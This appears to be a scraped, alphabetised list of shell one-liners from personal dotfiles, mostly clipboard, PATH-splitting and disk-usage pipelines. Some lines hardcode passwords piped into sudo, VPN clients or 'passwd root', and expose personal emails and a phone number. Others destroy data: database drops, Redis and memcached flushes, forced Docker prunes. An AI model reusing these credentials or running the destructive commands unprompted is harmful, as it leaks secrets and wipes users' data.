echo -e ${LD_LIBRARY_PATH//:/\\n} |sort
echo -e $PATH | tr ':' '\n'
echo -e $(cat ~/jokes.txt | shuf -n 1)
echo -e ""\n ========== ERROR LOG ==========\n ...""; grep -E ""Error [0-9]*|.*:[0-9]*:[0-9]*: error:"" < .mk.log; \
echo -2147483648 | pbcopy
echo -1 | sudo tee /proc/sys/kernel/perf_event_paranoid
echo *.tex | entr -r pdflatex -halt-on-error ./*.tex
echo **just add the file | using tar -xvzf** & tar -xzvf
echo **/* | tr
echo *(e:age today now:)|perl -pe 's/ /\n/g'
echo *(e-age $(date +%H:00) now-)|perl -pe 's/ /\n/g'
echo (command ls -1 | wc -l)
echo '👌👀👌👀👌👀👌👀👌👀 good shit go౦ԁ sHit👌 thats ✔ some good👌👌shit right👌👌there👌👌👌 right✔there ✔✔if i do ƽaү so my self 💯 i say so 💯 thats what im talking about right there right there (chorus: ʳᶦᵍʰᵗ ᵗʰᵉʳᵉ) mMMMMᎷМ💯 👌👌 👌НO0ОଠOOOOOОଠଠOoooᵒᵒᵒᵒᵒᵒᵒᵒᵒ👌 👌👌 👌 💯 👌 👀 👀 👀 👌👌Good shit' | pbcopy
echo '┬──┬◡ﾉ(ಠ益ಠﾉ)' | clipit
echo '┬──┬◡ﾉ(° -°ﾉ)' | tee >(pbcopy)
echo '┬──┬◡ﾉ(° -°ﾉ)' | clipit
echo '┬──┬︵/(ツ)\︵┬──┬' | clipit
echo '٩◔̯◔۶' | clipit
echo 'ノ┬─┬ノ ︵ ( \o°o )\' | clipit
echo 'ಠ_ಠ' | pbcopy
echo 'ಠ_ಠ' | clipit
echo '⌥'|pbcopy
echo '⌘'|pbcopy
echo '⇧'|pbcopy
echo '༼ つ ◕_◕ ༽つ' | pbcopy
echo '¯\_(ツ)_/¯' | xclip -selection clipboard
echo '¯\_(ツ)_/¯' | tee >(pbcopy)
echo '¯\_(ツ)_/¯' | pbcopy; echo '¯\_(ツ)_/¯'
echo '¯\_(ツ)_/¯' | pbcopy
echo '¯\_(ツ)_/¯' | clipit
echo '¯\\_(ツ)_/¯' | pbcopy
echo '¯\\\_(ツ)\_\/¯' | pbcopy
echo '|}'
echo '| python -mjson.tool'
echo 'yes' | dj-manage collectstatic
echo 'y' | docker volume prune
echo 'y' | docker image prune
echo 'y' | docker container prune
echo 'y' | cp $JENK/stack/x86_instances.json $WKSP/stack/
echo 'y' | command vim -c 'set nomore' +NeoBundleInstall! +NeoBundleUpdate! +NeoBundleClean! +qall!
echo 'stats' | nc localhost 11211
echo 'stats' | nc 127.0.0.1 11211
echo 'start_test_server_in_background' | mcom_irb && mcom_irb
echo 'start_test_server_in_background' | bcom_irb && bcom_irb
echo 'standby 0' | cec-client -s > /dev/null
echo 'sshuttle -r bitnami@ec2a 0/0:5432' | pbcopy
echo 'sshuttle -r bitnami@ec2a 0.0.0.0/0' | pbcopy
echo 'shutting down running vms'; VBoxManage list runningvms | sed -r 's/\
echo 'show processlist;' | mysql
echo 'show extwlist.extensions' | heroku pg:psql -r staging
echo 'recarrying-Chaviess-nonrelative-Araneida' | sudo openconnect -v --servercert sha256:5d7a3f7db85be6bd6f02a46c912d2a64f7db50b247f7f40fd5ea86affe6a8e0c -u streisand --passwd-on-stdin vl6.sudo.work:4443
echo 'rdr pass inet proto tcp from any to any port 80 -> 127.0.0.1 port 8181' | sudo pfctl -ef -
echo 'rdr pass inet proto tcp from any to any port 80 -> 127.0.0.1 port 8080' | sudo pfctl -mef -
echo 'rdr pass inet proto tcp from any to any port 80 -> 127.0.0.1 port 8080' | sudo pfctl -ef -
echo 'rdr pass inet proto tcp from any to any port 443 -> 127.0.0.1 port 8443' | sudo pfctl -mef -
echo 'rdr pass inet proto tcp from any to any port 25565 -> 192.168.64.2 port 25565' | sudo pfctl -ef -
echo 'rdr pass inet proto tcp from any to any port 2376 -> 127.0.0.1 port 2376' | sudo pfctl -ef -
echo 'paclog-pkglist <(tail -5000 /var/log/pacman.log | grep -A 100 -i 'pacman -Rcs')'"
echo 'paclog-pkglist <(tail -2000 /var/log/pacman.log | grep -A 3 -i 'pacman -S')'"
echo 'paclog-pkglist <(tail -100 /var/log/pacman.log | grep -A 3 -i installed)'"
echo 'on 0' | cec-client -s > /dev/null
echo 'nameserver 8.8.8.8' | sudo tee /etc/resolve.conf
echo 'nameserver 192.168.1.1' | sudo tee /etc/resolv.conf
echo 'mkdir ~/.vim/bundle 2>/dev/null && git clone https://github.com/scrooloose/nerdtree.git ~/.vim/bundle/nerdtree' | pbcopy
echo 'mellon' | sudo -S pip install
echo 'killing reef processes..' && jps | grep
echo 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' | pbcopy
echo 'http://eepurl.com/NxOeX' | pbcopy
echo 'http://0.0.0.0:8899' | pbcopy && python -m SimpleHTTPServer 8899
echo 'holler' | terminal-notifier -sound default
echo 'gotta :clap::skin-tone-3: get :clap::skin-tone-3: that :clap::skin-tone-3: bread :bread:' | xclip -selection c
echo 'git status | \grep -v \
echo 'git --version && wget https://raw.githubusercontent.com/andreicristianpetcu/dotfiles/develop/vimrc -O ~/.vimrc && vim' | xclip -sel clip
echo 'for elem in \$(ls -d LTE*); do mod=\$(echo \$elem | sed 's/^LTE\(.*\)/\1/'); git mv \$elem \$mod; done'
echo 'flush_all' | nc localhost 11211 && rake tmp:cache:clear
echo 'flush_all' | nc localhost 11211
echo 'flush_all' | nc 127.0.0.1 11211
echo 'flush_all' | nc -q 2 $memcached_ip $memcached_port
echo 'flush_all' | nc ${MEMCACHED_URI} 11211
echo 'ffmpeg -i in.mov -s 601x400 -pix_fmt rgb24 -r 10 -f gif - | gifsicle --optimize=3 --delay=3 > out.gif'
echo 'edalinuxa8newow' | openconnect --no-cert-check vpn.ooyala.com -u aakimov --passwd-on-stdin --authgroup 'Full VPN (aka BigTunnel)' --background
echo 'echo \$- | grep -q i 2>/dev/null && . ~/.config/bash/local.sh' >> ~/.bashrc;source ~/.bashrc
echo 'echo 3 > /proc/sys/vm/drop_caches' | sudo sh
echo 'drop database minmasterstudio; create database minmasterstudio owner minmaster;' | psql postgres
echo 'drop database minmasterdevelopment; create database minmasterdevelopment owner minmaster;' | psql postgres
echo 'drop database circle_test; create database circle_test owner ubuntu;' | psql postgres
echo 'docker image ls --filter=dangling=true --quiet | xargs docker image rm'
echo 'dev-password' | clip
echo 'd *' | mail -N
echo 'content=Call mom in 20 minutes' | http --form http://localhost:3001/create -v
echo 'content=Call mom in 20 minutes' | http --form $GOOF_HOST/create -v
echo 'content=Buy Beer' | http --form http://localhost:3001/create -v
echo 'content=Buy Beer' | http --form $GOOF_HOST/create -v
echo 'connect 00:16:94:1A:C9:EC' | bluetoothctl; pacmd set-default-sink 3
echo 'chushimima' |passwd root --stdin
echo 'cat ~/.blocked_hosts > /etc/hosts' | sudo zsh && flushhostcache && pkill 'Google Chrome' && open -a '/Applications/Google Chrome.app'
echo 'blacklist uvcvideo' | sudo tee /etc/modprobe.d/blacklist.conf; echo '[Disable] WebCam'
echo 'awful.util.restart()' | awesome-client -
echo 'a' | sudo /usr/local/mysql/support-files/mysql.server stop
echo 'a' | sudo /usr/local/mysql/support-files/mysql.server start
echo 'a' | sudo -S lsof -nP -iTCP -sTCP:LISTEN
echo '\n（╯ಠ▃ಠ）╯︵ ┻━┻\n' | pbcopy
echo '\n（┬──┬ ノ( ゜-゜ノ)\n' | pbcopy
echo '\n（╯°□°）╯︵ ┻━┻\n' | pbcopy
echo '\n======= GIT PUSH ALL REMOTES >>>>>>>' && git remote | xargs -L1 git push --all && echo '' && echo '======= GIT GC >>>>>>>' && git gc
echo '\n ಥ﹏ಥ\n' | pbcopy
echo '\n ಠ▃ಠ\n' | pbcopy
echo '\n ಠ‿ಠ\n' | pbcopy
echo '\n ಥ_ಥ\n' | pbcopy
echo '\n ಠ_ಠ\n' | pbcopy
echo '\n •_•)\n( •_•)>⌐■-■\n(⌐■_■)\n' | pbcopy
echo '\n ಠ.ಠ\n' | pbcopy
echo '\U0001F984 \U0001F525 ok \U0001F525 \U0001F984' && echo -n $VPN | pbcopy
echo 'YEET YEET YEET YEET YEET YEET YEET YEET YEET YEET YEET YEET' | figlet
echo 'Use a CONST_STYLE_VARIABLE instead of a magic number here please.' | pbcopy
echo 'Time machine log:';syslog -F '$Time $Message' -k Sender com.apple.backupd -k Time ge -72h | tail -n 10
echo 'Thanks!' | mutt -s 'Taking lunch at ' -c'cassius.rhue@us.sios.com' -c'todd.frye@us.sios.com' 'tom.beckenhauer@us.sios.com' 'jesse.nichols@us.sios.com'
echo 'Tasks assigned by Buni:' && todo.sh |grep Buni
echo 'Shell: You need to specify whom to kill' | lolcat
echo 'Shell: Peace not found' | lolcat
echo 'Shell: Love not found' | lolcat
echo 'Shell: Happines not found' | lolcat
echo 'Shell: But! Genocide is illegal Sir!!' | lolcat
echo 'Seans free alias:-'; top -l 1|grep 'PhysMem'
echo 'Running...' | lolcat -p 1 -a -s 100 -S 10 && make run
echo 'Run tests'; launch-test | tee testlog.txt; echo 'Tests has been completed'; result-test
echo 'Ru\$rih4z' | pbcopy
echo 'Rails.cache.clear' | bundle exec rails c
echo 'Please no direct DOM manipulation in a Tungsten view or model.\n \nSee https://kb.wayfair.com/javascript#Tungsten.js_patterns' | pbcopy
echo 'Please fix the linter issues and then we'll do a full JS review. | pbcopy
echo 'Please explain exactly what this regex does. Explanatory comments are required for all regular expressions.\n \nSee https://kb.wayfair.com/javascript#Comments' | pbcopy
echo 'Ping!' | mutt -s 'When you have a minute.' 'tom.beckenhauer@us.sios.com'
echo 'Ping!' | mutt -s 'When you have a minute.' 'jesse.nichols@us.sios.com'
echo 'Omega143' | sudo -S docker
echo 'Lolicon! owo' | lolcat
echo 'Kill process using 52698 (kill ###)'; sudo netstat -antpl | grep 52698
echo 'G1BxIjE7MTs5MzsxNCMwOzI7NjA7MDswIzE7MjswOzY2OzAjMjsyOzU2OzYwOzAjMzsyOzQ3OzM4\nOzk3IzQ7Mjs3MjswOzY5IzU7MjswOzY2OzcyIzY7Mjs3Mjs3Mjs3MiM3OzI7MDswOzAjMCExMX4j\nMSExMn4jMiExMn4jMyExMn4jNCExMn4jNSExMn4jNiExMn4jNyExMH4tIzAhMTF+IzEhMTJ+IzIh\nMTJ+IzMhMTJ+IzQhMTJ+IzUhMTJ+IzYhMTJ+IzchMTB+LSMwITExQiMxITEyQiMyITEyQiMzITEy\nQiM0ITEyQiM1ITEyQiM2ITEyQiM3ITEwQhtc' | base64 -d
echo 'Fetch all remote branches'; git branch -r | awk -F'/' '{print \
echo 'FLUSHALL' | redis-cli -n 2
echo 'Docker system prune'; yes | docker system prune
echo 'Copying latest commit hash to clipboard...' && git rev-parse --verify HEAD | simple_clipboard
echo 'Congr4tul4tions' | sudo -S shutdown -r now
echo 'Congr4tul4tions' | sudo -S shutdown -h now
echo 'Capturing screenshot...' && adb shell screencap -p | perl -pe 's/\x0D\x0A/\x0A/g' >
echo 'Always wrap JSON.parse calls in a try/catch.\n \nSee https://kb.wayfair.com/javascript#General_patterns' | pbcopy
echo '===== cleaning branches =====' && git branch --merged | grep -v \
echo '<xml></xml>' | curl -X POST -H 'Content-type: text/xml' -d @-
echo '589693218159079021' | pbcopy && echo 'Account Copied!'
echo '16i[q]sa[ln0=aln100%Pln100/snlbx]sbA0D4D465452snlbxq' | dc
echo '1-1' |sudo tee /sys/bus/usb/drivers/usb/unbind
echo '1-1' |sudo tee /sys/bus/usb/drivers/usb/bind
echo '0746 430 4048' | xsel -i -b
echo '0' | sudo tee /sys/class/leds/smc::kbd_backlight/brightness
echo '------------------------------------------------------------'; curl -s randomfunfacts.com | LANG=C sed -n 's/.*<i>\(.*\)<\/i>.*/\1/p'; echo '------------------------------------------------------------'
echo '---------------------------------' && log --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short
echo '-- local'; git branch; echo '-- remote'; git branch --remote | grep -v \
echo '(ノಠ益ಠ)ノ彡 ┻━┻' | clipit
echo '(╯°□°）╯︵ ┻━┻' | tee >(pbcopy)
echo '(╯°□°）╯︵ ┻━┻' | pbcopy
echo '(╯°□°)╯︵ ┻━┻' | clipit
echo '(˘_˘٥)' | clipit
echo '(ง'̀-'́)ง' | pbcopy
echo '(=^··^=)' | pbcopy
echo '( ͡° ͜ʖ ͡°)' | pbcopy
echo '( '３' )ノ' | pbcopy
echo '' | sudo tee /etc/modprobe.d/blacklist.conf; echo '[Enable] WebCam'
echo '' | pbcopy
echo '' | fzf --print-query --preview 'ruby -e {q}'
echo '' | fzf --print-query --preview 'python3 -c {q}'
echo '${BLUE}-- docker cleanup: rmia..${NORMAL}' && docker images -q | xargs docker rmi
echo '${BLUE}-- docker cleanup: rmi..${NORMAL}' && docker images -q -f dangling=true | xargs docker rmi
echo '${BLUE}-- docker cleanup: rm..${NORMAL}' && docker ps -q | xargs docker rm
echo '${BLUE}-- docker cleanup: kill..${NORMAL}' && docker ps -q | xargs docker kill
echo '$PWNL'|sudo -p '' -kS
echo '$PORTMAP' | sudo pfctl -ef -
echo '$@' | watson start email-recap
echo '$@' | watson start email-dos
echo '$1' | sed -e 's/ /+/g'
echo '$*' | espeak
echo '#R2JPPRRO' | pbcopy && echo 'BrawlStars Code Copied!'
echo '#@VPNC_GENERATED@\nnameserver 127.0.0.1' | sudo tee /etc/resolv.conf
echo '![LGTM](//lgtmoon.herokuapp.com/images/23050)'|pbcopy
echo '!!' | xclip
echo '!!' | mutt -s 'subj' izzisb@gmail.com
echo ' ¯\\_(ツ)_/¯' | pbcopy
echo &1 && cat ~/code/$1/README.md > /dev/null 2> /dev/null && pandoc -f markdown_github - | lynx -stdin
echo && curl -Is slashdot.org | sed -ne '/^X-[FBL]/s/^X-//p' && echo
echo && $zshrc_programs/neofetch/neofetch | $zshrc_programs/lolcat/bin/lolcat -t
echo ${ps_title}; ps | egrep -i
echo ${phone:0:11} | pbcopy
echo ${file##*/} | grep -Eo '[[:digit:]]{4}_[[:digit:]]{2}_[[:digit:]]{2}'
echo ${PYTHONPATH} | tr \: \\n
echo ${PWD} | xsel -b
echo ${PATH} | tr \: \\n
echo ${PATH} | tr : \\n
echo ${PATH} | tr -s \
echo ${PATH} | tr ':' '\n'
echo ${PATH} | sed 's/:/\n/g'
echo ${LIBRARY_PATH} | tr \: \\n
echo ${LD_LIBRARY_PATH} | tr \: \\n
echo ${$(g config --get svn-remote.svn.fetch | cut -d: -f2)#refs/remotes/}
echo $ww | copy
echo $sword | xsel -b
echo $password | sudo apachectl restart
echo $password | sudo -S cp /etc/hosts_remote /etc/hosts
echo $password | sudo -S cp /etc/hosts_local /etc/hosts
echo $passwd | sudo -S
echo $nafpass | kinit glusheno@DESY.DE; aklog
echo $devunreg | copy
echo $devreg | copy
echo $[`whoami | str2num -n5` % 8]
echo $[`ls -l | wc -l`-1]
echo $[`hostname | str2num -n5` % 8]
echo $X | bufandarosa -c
echo $V_PASS; ssh $(echo $V_CONN | sed 's/ssh //'); history -c
echo $VIRTUAL_ENV/lib/python2.7/site-packages/ | xclip -i
echo $VIRTUAL_ENV | xargs > ~/.bash_ve
echo $VAULT_AUTH_GITHUB_TOKEN | pbcopy
echo $USER_PW | sudo -S shutdown -h now
echo $THE_USUAL | sudo -S apt-get update
echo $SSH_CLIENT | awk '{print $1}'
echo $RANDOM | md5sum
echo $PYTHONPATH | tr ':' '\n'
echo $PYTHONPATH | sed 's/:/\n/g'
echo $PWD | xsel -b
echo $PWD | xsel --clipboard --input
echo $PWD | xclip -i; xclip -o
echo $PWD | x -i
echo $PWD | pbcopy
echo $PWD >| $TMP/$USER-lastPWD; ls -h --color=auto
echo $PS1 | hd
echo $PATH |sed -e s/:/\\\n/g
echo $PATH | xargs -d: -i find {} -executable -type f
echo $PATH | xargs -d ':' ls -R
echo $PATH | tr \: \\n
echo $PATH | tr \
echo $PATH | tr : \\n
echo $PATH | tr : \\\\n
echo $PATH | tr : '\n'
echo $PATH | tr -s ':' '\n'
echo $PATH | tr ':' '\n'
echo $PATH | tr
echo $PATH | sed \
echo $PATH | sed -e 's/:/\'$'\n/g'
echo $PATH | sed 's/:/\n/g'
echo $PATH | sed 's/:/\'$'\n/g'
echo $PATH | sed
echo $PATH | perl -pne
echo $PATH | perl -pi -e s/:/\\n/g
echo $PATH | perl -pe 's/:/\n/g'
echo $PATH | gsed -e 's/:/\\n/g'
echo $PATH | grep
echo $PATH | ddown
echo $PATH | awk -v RS=: '1'
echo $PASSWORD_SECRET|sudo -p '' -kS
echo $MANPATH | tr ':' '\n'
echo $LS_COLORS | tr :
echo $LD_LIBRARY_PATH | tr ':' '\n'
echo $LD_LIBRARY_PATH | sed \
echo $LD_LIBRARY_PATH | sed 's/:/\n/g'
echo $HOME/Projects/$(ls $HOME/Projects | fzf)
echo $DRYDOCK_PASS | docker login --username luis.gomez@workiva.com --password-stdin drydock.workiva.net
echo $DOCKER_PASSWORD | docker login --username $DOCKER_USERNAME --password-stdin
echo $DJANGO_SETTINGS_MODULE | cut -d . -f 3
echo $DEMO_SECRET_KEY | pbcopy
echo $DEMO_API_KEY | pbcopy
echo $CLASSPATH | tr : '\n'
echo $CLASSPATH | tr ':' '\n'
echo $CLASSPATH | sed 's/:/\n/g'
echo $CDPATH | tr ':' '\n'
echo $BRANCH | tr -d
echo $@ | espeak -s 120 2>/dev/null
echo $@ | aspell -a list
echo $1 | xargs setsid google-chrome
echo $1 | wall
echo $1 | jq
echo $1 | espeak -ven-rp+f1 -s250 2>/dev/null
echo $1 | espeak
echo $1 | cat - ~/.config/signal/history.log > .tempMessage && mv .tempMessage ~/.config/signal/history.log
echo $1 | cat - ~/.config/signal/history.log > .temp && mv .temp ~/.config/signal/history.log
echo $1 | ./Scripts/cats.sh
echo $* | nkf -w --url-input
echo $* | bc -l
echo $(xsel -o) | wc -c
echo $(tn list | peco)
echo $(svn st | awk
echo $(shuf -n 10 /usr/share/dict/words --random-source=/dev/urandom | tr '\n' ' ')
echo $(sensors | awk '/Package/ {print $4}')
echo $(python3 -V | grep -Eo '[0-9\.]+$')
echo $(python2 /Users/twer/dev/bash-vpn/totp_github.py) | pbcopy
echo $(python2 /Users/twer/dev/bash-vpn/totp.py) | pbcopy
echo $(pwd)/| xclip
echo $(pwd) | xclip -selection clipboard
echo $(pwd) | xclip
echo $(pwd) | pbcopy
echo $(openssl rand -base64 16 | head -c 16)
echo $(ls -l | wc -l)
echo $(ls -1tr | tail -1)
echo $(ls -1 | wc -l)
echo $(ipconfig getifaddr $(networksetup -listallhardwareports | awk '/Hardware Port: Wi-Fi/{getline; print $2}'))
echo $(ip route get 8.8.8.8 | awk 'NR==1 {print $NF}')
echo $(ifconfig | grep
echo $(hostname | sed s/\.local$//)
echo $(hostname -I | cut -d ' ' -f 1); sudo python3 -m http.server --bind 0.0.0.0 80
echo $(history 0|peco)
echo $(hi | tail -n 1):8888; darkhttpd \$PWD --port 8888
echo $(git symbolic-ref HEAD | cut -d
echo $(git rev-parse HEAD) && git rev-parse HEAD | pbcopy
echo $(git rev-parse --show-toplevel)/google3/blaze-bin$(git rev-parse --show-prefix | sed s/google3//)
echo $(git rev-parse --short HEAD) && git rev-parse --short HEAD | pbcopy
echo $(git rev-parse --abbrev-ref HEAD) | pbcopy
echo $(git merge-base HEAD origin/master)..HEAD | git pack-objects --revs --thin --stdout --all-progress-implied > packfile
echo $(gdate --iso-8601=ns) | tr -c \
echo $(fc -ln -1) | pbcopy
echo $(fc -l -1) | pbcopy
echo $(echo $(cat /sys/class/thermal/thermal_zone0/temp) / 1000 | bc) °C
echo $(dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | awk -F '
echo $(date --rfc-3339=ns | cut -d' ' -f1)
echo $(date +%y%m%d%H)_$(($RANDOM%10))$(($RANDOM%10))$(($RANDOM%10))$(($RANDOM%10)) | xargs mkdir
echo $(curl -s httpbin.org/ip | jq '.origin')
echo $(curl -s checkip.dyndns.org | sed -e 's/.*IP: //' -e 's/<.*$//')
echo $(clip -o) | fex /-1
echo $(cat ~/.macosa/.vaultpass) | sudo -S killall -HUP mDNSResponder
echo $(awk '{print $2}' <<< $(netstat -nr -f inet | grep default))
echo $(__git_ps1) | pbcopy
echo $(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c12)
echo $(< /dev/urandom tr -dc \._A-Z-a-z-0-9 | head -c32)
echo $(/sbin/ifconfig | grep -E
echo $(($(snapper list | wc -l)-3))
echo $(($(find | wc -l)-1))
echo $(( `ps axms | wc -l` - 1))
echo $(( 1+RANDOM%88 )) | figlet
echo $(( 1+RANDOM%6 )) | figlet
echo $(( 1+RANDOM%54 )) | figlet
echo $(( $(head -c 2 /dev/random | od -i -An) % 10 ))
echo $(( $(cat ~/stuff/chaosdorf/mateguthaben) - 150 )) | sponge ~/stuff/chaosdorf/mateguthaben
echo $(( $(cat ~/stuff/chaosdorf/mateguthaben) - 100 )) | sponge ~/stuff/chaosdorf/mateguthaben
echo $( tr -dc A-Za-z0-9_ < /dev/urandom | head -c8 )
echo $'kernel:\n\t$(kernel)\nos:\n\t$(os | awk -vRS=
echo $'inodes:\n$(inodes | awk -vRS=
echo ""$PWD/$so -> /system/${so#*/system/}"" | grep "" /system/.*""
echo ""$PWD/$so -> $MMREPLACETO"" | grep "" $MMREPLACETO""
echo "" "" | sudo tee -a ~/.bashrc
echo !! | xcopy
echo !! | x
echo !! | pbcopy
ecex mpc clear && ecex getLyricalSongs | ecex mpc add && ecex mpc shuffle && ecex mpc play
ec2-m | jq -r .PrivateIpAddress
ec2-describe-instances | grep
ec2-describe-instances | egrep -e ^I
ec2-describe-images -o amazon | grep kernel
ec2 '*chirp*' | grep 10.1
ec2 '*chirp*' | grep 10.0
ec BOO | dog
ec $ipadr|cut -d. -f4
ebuild $(ls -1 *.ebuild | head -n1) manifest
e -O $( git diff --name-only | uniq )
dzil stale --all | xargs cpm install --global
dz list -c | grep -i
dxd user-login | pbcopy && open $(pbpaste)
dvt | pbcopy; dvt
dush err.txt generated.file succ.txt | sort -h
dumpsys activity | grep -B 1 \
dumpsys activity top | grep -B 1 \
dumount; sudo mount -t nfs dev.pluralsight.com:/opt/assessment-tools /opt/assessment-tools; mount | grep pluralsight
duf | sort -n
dudirs | sort -n
du1 | sort -h
du-hsckx err.txt generated.file succ.txt | sort -nr
du | sort -n
du | sort -k1hr
du | sort -k 1 -n -r
du | sort -h
du | sort
du | less
du | grep -oE '([0-9\.]+M.*)'
du | grep -oE '([0-9\.]+K.*)'
du | grep -oE '([0-9\.]+G.*)'
du | grep -oE '([0-9\.]+B.*)'
du /home/hwchen/Dropbox/* | sort -n
du ./err.txt ./generated.file ./succ.txt -s | sort -g
du . -ha --max-depth=1 | sort -h
du . -h --max-depth=1 | sort -rh
du . -h --max-depth=1 | sort -hr
du -xs err.txt generated.file succ.txt | sort -n
du -xmh --max-depth=1 | sort -rh
du -xksh err.txt generated.file succ.txt | sort -h
du -xh -d 1 | sort -hr
du -xh --max-depth=1 | sort -h
du -xch . --max-depth=1 | sort -h
du -xa | sort -rn
du -x -m | sort -nr
du -x --max-depth=1 | sort -n
du -x --block-size=1048576 | sort -nr
du -sx ./err.txt ./generated.file ./succ.txt 2>/dev/null | sort -n
du -smx .[!.]* err.txt generated.file succ.txt | sort -n
du -smh err.txt generated.file succ.txt | sort -nr
du -smc err.txt generated.file succ.txt |sort -n
du -sm | sort -n
du -sm .[!.]* err.txt generated.file succ.txt | sort -nr
du -sm ./err.txt ./generated.file ./succ.txt | sort -nr
du -sm -- err.txt generated.file succ.txt | sort -n
du -sm err.txt generated.file succ.txt | sort -nr
du -sm err.txt generated.file succ.txt | sort -n -k 1
du -sm err.txt generated.file succ.txt | sort -n
du -sm err.txt generated.file succ.txt | sort -h
du -sm err.txt generated.file succ.txt | sort -g -r
du -sm $1 | awk \'{print \$1}\'
du -sm $1 | awk '{ print \$1/1000 \
du -skh | cut -f1
du -skh *|sort -nr
du -skh err.txt generated.file succ.txt | sort -nr
du -skh err.txt generated.file succ.txt | sort -n
du -skch err.txt generated.file succ.txt | sort -rn
du -skc err.txt generated.file succ.txt | sort -rn
du -skc err.txt generated.file succ.txt | sort -n
du -sk ./*|sort -n
du -sk . | sort -n
du -sk *|sort -nr
du -sk *xml | sort +0n
du -sk */ | sort -n
du -sk err.txt generated.file succ.txt |sort -nr
du -sk err.txt generated.file succ.txt |sort -n
du -sk err.txt generated.file succ.txt | sort -nr
du -sk err.txt generated.file succ.txt | sort -n --
du -sk err.txt generated.file succ.txt | sort -n
du -sk err.txt generated.file succ.txt | s0rt
du -sk err.txt generated.file succ.txt 2>/dev/null | sort -rn
du -sk err.txt generated.file succ.txt .[!.]* 2>/dev/null | sort -n
du -sk err.txt generated.file succ.txt .??* | sort -rn
du -shx */ | sort -h
du -shx err.txt generated.file succ.txt | sort -rhk1
du -shx err.txt generated.file succ.txt | sort -hr
du -shx err.txt generated.file succ.txt | sort -h
du -shm err.txt generated.file succ.txt .[^.]* | sort -n
du -shcx err.txt generated.file succ.txt .[^.]* 2>/dev/null | sort -h
du -shc .??* err.txt generated.file succ.txt | sort -hr
du -shc . .. err.txt generated.file succ.txt | sort -hr
du -shc -- *(D) | sort -h
du -shc -- err.txt generated.file succ.txt | sort -h
du -shc err.txt generated.file succ.txt | sort -hr
du -shc err.txt generated.file succ.txt | sort -h
du -sh | sort -h
du -sh | grep M
du -sh | grep G
du -sh /home/will/.local/share/Trash | awk '{print \
du -sh .[!.]* err.txt generated.file succ.txt | sort -h
du -sh ./. ./.. | sort -h
du -sh ./*/ | sort -h
du -sh ./err.txt ./generated.file ./succ.txt | sort -nr
du -sh ./err.txt ./generated.file ./succ.txt | sort -n
du -sh ./err.txt ./generated.file ./succ.txt | sort -hr
du -sh ./err.txt ./generated.file ./succ.txt | sort -h
du -sh ./err.txt ./generated.file ./succ.txt | gsort -h
du -sh . .. | sort -rh
du -sh . .. | sort -h
du -sh . | sort -h
du -sh -d1 err.txt generated.file succ.txt | gsort -h
du -sh -B M err.txt generated.file succ.txt | sort -nr
du -sh -- err.txt generated.file succ.txt | sort -hr
du -sh -- err.txt generated.file succ.txt | sort -h
du -sh *|sort -nr
du -sh *|sort -h
du -sh *| sort -rh
du -sh */ | sort -n
du -sh */ | sort -h
du -sh */ | sort
du -sh */ | gsort -h
du -sh */ 2>/dev/null | sort -h
du -sh */ 2> /dev/null | sort -hr
du -sh *(D) | grep G
du -sh err.txt generated.file succ.txt |sort -n
du -sh err.txt generated.file succ.txt | sort -sh
du -sh err.txt generated.file succ.txt | sort -rh
du -sh err.txt generated.file succ.txt | sort -r -h
du -sh err.txt generated.file succ.txt | sort -r
du -sh err.txt generated.file succ.txt | sort -nr
du -sh err.txt generated.file succ.txt | sort -n
du -sh err.txt generated.file succ.txt | sort -k1 -h -r
du -sh err.txt generated.file succ.txt | sort -hr
du -sh err.txt generated.file succ.txt | sort -h -r
du -sh err.txt generated.file succ.txt | sort -h
du -sh err.txt generated.file succ.txt | sort
du -sh err.txt generated.file succ.txt | gsort -hr
du -sh err.txt generated.file succ.txt | gsort -h
du -sh err.txt generated.file succ.txt | grep M
du -sh err.txt generated.file succ.txt | grep G
du -sh err.txt generated.file succ.txt 2>/dev/null|perl -ne
du -sh err.txt generated.file succ.txt 2>/dev/null | sort -rh
du -sh err.txt generated.file succ.txt 2> /dev/null | sort -h
du -sh err.txt generated.file succ.txt .[!.*] 2>/dev/null|sort -hr
du -sh err.txt generated.file succ.txt .. | sort -h
du -sh err.txt generated.file succ.txt . .. | sort -hr
du -sh err.txt generated.file succ.txt . .. | sort -h
du -sh err.txt generated.file succ.txt . .. | gsort -h
du -sh err.txt generated.file succ.txt . .. 2>/dev/null | sort -h
du -sh $(ls) | sort -nr
du -sh $(ls -a) | sort -nr
du -sgcx err.txt generated.file succ.txt | sort -n
du -scmx -- *|sort -n
du -scm *|sort -n
du -scm err.txt generated.file succ.txt | sort -n
du -sckxh err.txt generated.file succ.txt | sort -nr
du -sckxh err.txt generated.file succ.txt | sort -hr
du -sckx err.txt generated.file succ.txt | sort -nr' #directories sorted by size
du -sckx err.txt generated.file succ.txt | sort -nr' # directories sorted by size
du -sckx err.txt generated.file succ.txt | sort -nr' # Directories sorted by size
du -sckx err.txt generated.file succ.txt | sort -nr'
du -sckx err.txt generated.file succ.txt | sort -nr
du -sckhx err.txt generated.file succ.txt | sort -nr
du -sckh err.txt generated.file succ.txt | sort -rh
du -sck err.txt generated.file succ.txt | sort -rn
du -sck err.txt generated.file succ.txt | sort -n
du -schx ./err.txt ./generated.file ./succ.txt | sort -h
du -sch .[^.]* err.txt generated.file succ.txt |sort -h
du -sch .[!.]* err.txt generated.file succ.txt |sort -hr
du -sch .[!.]* err.txt generated.file succ.txt |sort -h
du -sch .[!.]* err.txt generated.file succ.txt | sort -k 2
du -sch .[!.]* err.txt generated.file succ.txt | sort -h
du -sch .[!.]* err.txt generated.file succ.txt | gsort -h
du -sch .[!.]* err.txt generated.file succ.txt 2>/dev/null |sort -h
du -sch ./err.txt ./generated.file ./succ.txt | sort -h
du -sch . .. err.txt generated.file succ.txt | sort -h
du -sch */ err.txt generated.file succ.txt | sort -h
du -sch *(N) | sort -h
du -sch err.txt generated.file succ.txt | sort -rh
du -sch err.txt generated.file succ.txt | sort -n
du -sch err.txt generated.file succ.txt | sort -k1 -h
du -sch err.txt generated.file succ.txt | sort -hr
du -sch err.txt generated.file succ.txt | sort -h
du -sch err.txt generated.file succ.txt | gsort -rh
du -sch err.txt generated.file succ.txt | egrep '[MG]'
du -sch err.txt generated.file succ.txt 2>/dev/null | sort -h
du -sc ./err.txt ./generated.file ./succ.txt | sort -nr
du -sc err.txt generated.file succ.txt | sort -n
du -sc err.txt generated.file succ.txt | sort -g
